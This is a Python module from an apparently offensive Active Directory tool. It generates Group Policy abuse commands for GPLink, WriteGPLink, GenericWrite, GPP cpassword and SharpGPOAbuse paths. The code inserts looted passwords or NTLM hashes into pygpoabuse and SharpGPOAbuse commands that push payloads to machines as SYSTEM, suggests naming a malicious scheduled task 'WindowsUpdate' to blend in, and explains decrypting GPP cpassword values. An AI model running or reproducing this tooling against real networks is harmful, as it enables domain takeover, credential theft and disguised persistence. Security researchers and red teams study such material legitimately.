from __future__ import annotations

from typing import Any, Dict, List, Tuple
from engine.commands import CommandProvider
from engine import state as est
import logging

log = logging.getLogger("nanohound.commands.gpo_abuse")


@CommandProvider.register("gpo_abuse")
def generate(source: Dict[str, Any], target: Dict[str, Any], domain: str, creds: Dict[str, Any] | None = None, network_context: Dict[str, Any] | None = None) -> List[Tuple[str, str]]:
    """GPO abuse guidance for GPLink, GPPPassword, and SharpGPOAbuse flows.

    Signature: (source, target, domain, creds, network_context)
    """
    creds = creds or {}
    lm = getattr(est, "loot_manager", None)
    ge = getattr(est, "graph_engine", None)
    node_utils = CommandProvider.utils.node
    network = CommandProvider.utils.network
    src = source or {}
    tgt = target or {}
    edge = creds.get("edge") or creds.get("edge_type") or ""

    results: List[Tuple[str, str]] = []

    # Legacy monolith removed; rely on provider logic and local heuristics

    # Helper: build auth part from loot when available
    domain = domain or node_utils.infer_domain(src, tgt) or src.get("domain") or tgt.get("domain") or "<DOMAIN>"
    username = src.get("name") or "<USER>"
    auth_part = ""
    try:
        cred = node_utils.get_credential_record(lm, ge, type("N", (), src) if isinstance(src, dict) else src)
        if cred:
            # Prefer auth_flags helper
            flags = node_utils.auth_flags(lm, type("N", (), src) if isinstance(src, dict) else src)
            if flags:
                auth_part = f" {flags}"
            else:
                u = getattr(cred, "username", "") or username
                p = getattr(cred, "password", "") or getattr(cred, "ntlm_hash", "")
                if u or p:
                    auth_part = f" -u {u} -p '{p}'"
    except Exception:
        pass

    # GPLink: linked GPO applies settings to the target container
    if edge == "GPLink" or str(edge).upper().endswith("GPLINK"):
        target_container = tgt.get("name") or "<TARGET_DOMAIN_OR_OU>"
        gpo_name = src.get("name") or "<LINKED_GPO>"
        gpo_guid = src.get("id") if src.get("id") and "-" in str(src.get("id")) else "<GPO_GUID>"
        results.append((
            "GPLink - apply payload via pygpoabuse",
            f"# GPLink: the linked GPO applies its settings to the target container\n"
            f"# Linked GPO: {gpo_name}  Target container: {target_container}\n"
            f"pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '{gpo_guid}' --command '<PAYLOAD_COMMAND>'\n"
            "# Windows alternative: SharpGPOAbuse.exe --AddComputerTask / --AddUserScript"
        ))
        # Additional quick checks copied from legacy templates
        results.append((
            "Inspect container / GPLink",
            "# Inspect parent container ACLs and GPLink settings:\n"
            f"powershell -c \"Get-DomainObjectAcl -Identity '{tgt.get('dn','<TARGET_DN>')}' -ResolveGUIDs\"\n"
            f"powershell -c \"Get-DomainOU -Identity '{tgt.get('name','<PARENT_OU>')}' -Properties gplink\""
        ))
        results.append(("GPO report (XML)", "Get-GPOReport -Name '<GPO_NAME>' -ReportType Xml -Path gpo.xml ; inspect gpo.xml for scripts and cpassword"))
        return results

    # WriteGPLink: link an attacker-controlled GPO into target scope
    if edge == "WriteGPLink":
        target_scope = tgt.get("name") or "<TARGET_OU_OR_DOMAIN>"
        gpo_guid = src.get("id") or "<GPO_GUID>"
        results.append((
            "WriteGPLink - weaponize + link GPO",
            "# WriteGPLink: can modify gPLink on target OU/domain scope to apply attacker-controlled GPOs\n"
            f"# Target scope: {target_scope}\n"
            "# 1) Create/weaponize a GPO (SharpGPOAbuse/pyGPOAbuse)\n"
            "# 2) Link it to the target scope via gPLink (optionally enforced / filtered)\n"
            f"pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '<GPO_GUID>' --command '<PAYLOAD_COMMAND>'\n"
            "# Linux alternative for direct gPLink abuse: OUned.py"
        ))
        return results

    # GenericWrite on GPO: create scheduled task or startup script via GPO
    if (str(edge) in ("GenericWrite", "CanGenericWrite")) and tgt.get("type") == "gpo":
        gpo_id = src.get("id") or "<GPO_GUID>"
        results.append((
            "GenericWrite on GPO - create task/script",
            "# GenericWrite on GPO: create a scheduled task or startup script via the GPO to run as SYSTEM on in-scope machines.\n"
            f"# Option A (pygpoabuse): pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '{gpo_id}' --command '<POWERSHELL_PAYLOAD>'\n"
            "# Option B (PowerShell): Use New-GPOImmediateTask to create a scheduled task applied immediately to the OU/domain scope.\n"
            "# Example (PowerView / PowerShell): New-GPOImmediateTask -GPOName '<GPO_NAME>' -Command '<PAYLOAD>' -TaskName 'WindowsUpdate' -TriggerAtLogon"
        ))
        return results

    # GPPPassword: extract cpassword from GPO XML
    if edge == "GPPPassword" or str(edge).upper().endswith("GPPPASSWORD"):
        results.append((
            "GPP cpassword (inspect)",
            "# Export GPO XML and search for cpassword attributes under cpassword nodes.\n"
            "# Example: Get-GPOReport -Name '<GPO_NAME>' -ReportType Xml -Path gpo.xml ; then search gpo.xml for 'cpassword'\n"
            "# Decrypt cpassword using known AES key (GPP cpassword uses a static key) with existing tools (e.g., gpp-decrypt)."
        ))
        return results

    # SharpGPOAbuse: quick examples / pointers
    if str(edge).upper().startswith("SHARPGPO") or edge == "SharpGPOAbuse":
        results.append(("SharpGPOAbuse - enumerate/apply", "SharpGPOAbuse.exe enum -d <DOMAIN> -u <USER> -p '<PASSWORD>' # see project README for full usage"))
        results.append(("SharpGPOAbuse - exploit example", "SharpGPOAbuse.exe exploit -g '<GPO_NAME>' -d <DOMAIN> -u <USER> -p '<PASSWORD>'"))
        return results

    return results
